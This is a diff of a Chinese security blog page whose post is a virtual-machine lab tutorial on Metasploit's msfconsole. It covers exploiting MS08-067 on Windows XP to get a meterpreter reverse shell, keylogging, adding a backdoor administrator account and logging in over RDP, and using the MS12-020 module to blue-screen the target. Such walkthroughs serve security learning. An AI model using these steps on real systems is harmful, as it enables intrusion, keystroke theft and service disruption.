@@ -4,8 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hello World, 网络安全，计算机，渗透">
-    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex">
+    <meta name="keywords" content="关于msfconsole的应用, 网络安全，计算机，渗透">
+    <meta name="description" content="本篇文章介绍关于msfconsole的一些实例应用，主要是对ms08-067,ms12-020这两个实例的介绍以及应用。
+
+
+实验背景：都是在虚拟机下进行的啦，靶机采用的是winxpens3，确保所用的靶机有相关的漏洞才能攻击成功哦。并且攻">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +20,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Hello World | echozt</title>
+    <title>关于msfconsole的应用 | echozt</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -267,12 +270,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Hello World</h1>
+                    <h1 class="description center-align post-title">关于msfconsole的应用</h1>
                 </div>
             </div>
         </div>
@@ -386,9 +389,29 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">渗透</span>
+                            </a>
+                        
+                            <a href="/tags/msfconsole/">
+                                <span class="chip bg-color">msfconsole</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%94%BB%E5%87%BB/">
+                                <span class="chip bg-color">攻击</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E/">
+                                <span class="chip bg-color">漏洞</span>
+                            </a>
+                        
+                            <a href="/tags/kali/">
+                                <span class="chip bg-color">kali</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -400,7 +423,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-01-24
+                    2022-01-27
                 </div>
                 
 
@@ -409,7 +432,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    73
+                    1k
                 </div>
                 
 
@@ -431,21 +454,120 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+                <p>本篇文章介绍关于msfconsole的一些实例应用，主要是对ms08-067,ms12-020这两个实例的介绍以及应用。</p>
 <span id="more"></span>
 
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span>
+<h1 id="实验背景："><a href="#实验背景：" class="headerlink" title="实验背景："></a>实验背景：</h1><p>都是在虚拟机下进行的啦，靶机采用的是winxpens3，确保所用的靶机有相关的漏洞才能攻击成功哦。并且攻击机和靶机要处在同一局域网下才行哒，建议开启仅主机模式哦。还有一点，有些命令无效，可能是因为模式为普通用户模式，在命令前面使用sudo就好了，或者切换为root（su root)</p>
+<h1 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h1><p>攻击机：kali             ip地址：192.168.127.139</p>
+<p>靶机：winxpens3    ip地址：192.168.127.138</p>
+<h1 id="1、ms08-067（单个攻击）"><a href="#1、ms08-067（单个攻击）" class="headerlink" title="1、ms08-067（单个攻击）"></a>1、ms08-067（单个攻击）</h1><h2 id="1-1配置命令"><a href="#1-1配置命令" class="headerlink" title="1.1配置命令"></a>1.1配置命令</h2><p>首先进入msfconsole界面，</p>
+<pre class="line-numbers language-bash"><code class="language-bash">search ms08-067      <span class="token comment" spellcheck="true">#查找ms08-067漏洞</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo server
+<p>可以看到这个漏洞的基本信息：</p>
+<img src="/posts/5a76/1.png" class>
+
+<p>可以选择</p>
+<pre class="line-numbers language-bash"><code class="language-bash">use 0
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo generate
+<p>或者使用如下命令，一样的意思</p>
+<pre class="line-numbers language-bash"><code class="language-bash">use exploit/windows/smb/ms08_067_netapi
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo deploy
+<p>选择之后，发现提示信息，按照提示信息配置：</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<img src="/posts/5a76/2.png" class>
+
+<p>然后输入</p>
+<pre class="line-numbers language-bash"><code class="language-bash">show options
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>查看哪些是yes,即必填,如果它的Current Setting为空，则要对它进行设置，如</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> RHOSTS 192.168.127.138     <span class="token comment" spellcheck="true">#设置靶机地址</span>
+
+<span class="token keyword">set</span> LHOST 192.168.127.139      <span class="token comment" spellcheck="true">#设置攻击机地址</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h2 id="1-2运行攻击"><a href="#1-2运行攻击" class="headerlink" title="1.2运行攻击"></a>1.2运行攻击</h2><p>完成前面的配置之后，运行：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">run       <span class="token comment" spellcheck="true">#或者使用exploit,来实现攻击</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>成功进入如下界面：</p>
+<img src="/posts/5a76/3.png" class>
+
+<h2 id="1-3使用screenshot命令可对靶机界面进行截图："><a href="#1-3使用screenshot命令可对靶机界面进行截图：" class="headerlink" title="1.3使用screenshot命令可对靶机界面进行截图："></a>1.3使用screenshot命令可对靶机界面进行截图：</h2><pre class="line-numbers language-bash"><code class="language-bash">screenshot
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>截图默认保存在/home/kali目录下（命令下面会显示文件保存的路径），进入文件路径可以看到截图。</p>
+<img src="/posts/5a76/4.png" class>
+
+<h2 id="1-4查看并关闭靶机打开进程"><a href="#1-4查看并关闭靶机打开进程" class="headerlink" title="1.4查看并关闭靶机打开进程"></a>1.4查看并关闭靶机打开进程</h2><p>可以先使用ps命令查看靶机打开的进程号</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>然后可以使用kill关闭靶机的某个进程</p>
+<p>比如，靶机此时打开了记事本，我在攻击上使用ps查看的进程号为2516（这个进程号是随机变化的哈），使用如下命令：</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">kill</span> 2516
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>即可关闭通过攻击机关闭靶机的记事本进程</p>
+<img src="/posts/5a76/5.png" class>
+
+<h2 id="1-5监听靶机键盘内容"><a href="#1-5监听靶机键盘内容" class="headerlink" title="1.5监听靶机键盘内容"></a>1.5监听靶机键盘内容</h2><p>同样先使用ps查看靶机此时的进程及进程号，得到此时靶机记事本进程为484（靶机已经重新打开记事本进程）</p>
+<p>然后使用：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">migrate 484        <span class="token comment" spellcheck="true">#484为靶机开启的进程号</span>
+
+keyscan_start      <span class="token comment" spellcheck="true">#开启监听靶机键盘</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>然后在靶机上任意输一些内容，回到kali，然后输入以下命令，即可查看监听到的键盘内容</p>
+<pre class="line-numbers language-bash"><code class="language-bash">keyscan_dump       <span class="token comment" spellcheck="true">#得到监听内容</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/posts/5a76/6.png" class>
+
+<h2 id="1-6利用3389端口远程登录靶机"><a href="#1-6利用3389端口远程登录靶机" class="headerlink" title="1.6利用3389端口远程登录靶机"></a>1.6利用3389端口远程登录靶机</h2><p>在Windows上创建一个名称为zt密码为pass的用户，并提升为管理员权限</p>
+<pre class="line-numbers language-bash"><code class="language-bash">net user zt pass /add                   <span class="token comment" spellcheck="true">#创建新用户，用户名为zt密码为pass</span>
+
+net localgroup Administrators zt /add   <span class="token comment" spellcheck="true">#将用户加入Administrators组</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>确保靶机的3389端口已经打开，可以在kali上使用nmap扫描靶机地址查看靶机是否开启3389端口。</p>
+<pre class="line-numbers language-bash"><code class="language-bash">nmap -F 192.168.127.138            <span class="token comment" spellcheck="true">#查看靶机是否开启3389端口</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/posts/5a76/7.png" class>
+
+<p>发现3389端口已经打开，进入下一步。</p>
+<p>接下来重新打开一个终端，输入</p>
+<pre class="line-numbers language-bash"><code class="language-bash">rdesktop 192.168.127.138      <span class="token comment" spellcheck="true">#远程登录靶机</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p> 回车后会自动弹出如图所示的登录窗口</p>
+<img src="/posts/5a76/8.png" class>
+
+<p>使用创建的账户zt,密码pass即可远程登录靶机</p>
+<img src="/posts/5a76/9.png" class>
+
+<h1 id="2、ms12-020（导致对方蓝屏）"><a href="#2、ms12-020（导致对方蓝屏）" class="headerlink" title="2、ms12-020（导致对方蓝屏）"></a>2、ms12-020（导致对方蓝屏）</h1><h2 id="2-1配置命令"><a href="#2-1配置命令" class="headerlink" title="2.1配置命令"></a>2.1配置命令</h2><p>确定靶机的3389端口打开</p>
+<p>进入msfconsole，配置如下命令：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">search ms12-020   <span class="token comment" spellcheck="true">#查找ms12-020漏洞</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>查看信息，使用如下，这里因为0已经被修复，所以这里只能使用关于1的，不能使用use 0</p>
+<img src="/posts/5a76/10.png" class>
+
+<pre class="line-numbers language-bash"><code class="language-bash">use 1
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>或者使用如下，</p>
+<pre class="line-numbers language-bash"><code class="language-bash">use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>选择之后，发现提示信息，按照提示信息配置：</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> payload linux/x64/meterpreter/reverse_tcp
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/posts/5a76/11.png" class>
+
+<p>然后查看并配置所需命令：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">show options
+
+<span class="token keyword">set</span> RHOSTS 192.168.127.138    <span class="token comment" spellcheck="true">#配置靶机地址</span>
+
+<span class="token keyword">set</span> LHOST 192.168.127.139     <span class="token comment" spellcheck="true">#配置攻击机地址</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="2-2运行攻击"><a href="#2-2运行攻击" class="headerlink" title="2.2运行攻击"></a>2.2运行攻击</h2><p>完成前面的配置之后，运行：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">run       <span class="token comment" spellcheck="true">#或者使用exploit,来实现攻击</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/posts/5a76/12.png" class>
+
+<p>查看到出现seems down 表示攻击成功，已经致使目标机蓝屏了。</p>
+<img src="/posts/5a76/13.png" class>
 
                 
             </div>
@@ -472,7 +594,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://echozt.github.io/posts/3eeb.html">https://echozt.github.io/posts/3eeb.html</a>
+                    <a href="https://echozt.github.io/posts/5a76.html">https://echozt.github.io/posts/5a76.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -509,7 +631,27 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">渗透</span>
+                                </a>
+                            
+                                <a href="/tags/msfconsole/">
+                                    <span class="chip bg-color">msfconsole</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%94%BB%E5%87%BB/">
+                                    <span class="chip bg-color">攻击</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E/">
+                                    <span class="chip bg-color">漏洞</span>
+                                </a>
+                            
+                                <a href="/tags/kali/">
+                                    <span class="chip bg-color">kali</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -681,9 +823,72 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/posts/5a76.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="关于msfconsole的应用">
+                        
+                        <span class="card-title">关于msfconsole的应用</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            本篇文章介绍关于msfconsole的一些实例应用，主要是对ms08-067,ms12-020这两个实例的介绍以及应用。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-27
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            echozt
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">渗透</span>
+                    </a>
+                    
+                    <a href="/tags/msfconsole/">
+                        <span class="chip bg-color">msfconsole</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%94%BB%E5%87%BB/">
+                        <span class="chip bg-color">攻击</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">漏洞</span>
+                    </a>
+                    
+                    <a href="/tags/kali/">
+                        <span class="chip bg-color">kali</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/posts/85e6.html">
                     <div class="card-image">
@@ -701,9 +906,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-25
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-25
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -720,44 +925,6 @@
                     </a>
                     
                 </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
-            </div>
-            <div class="card">
-                <a href="/posts/3eeb.html">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="Hello World">
-                        
-                        <span class="card-title">Hello World</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-24
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            echozt
-                            
-                        </span>
-                    </div>
-                </div>
-
                 
             </div>
         </div>
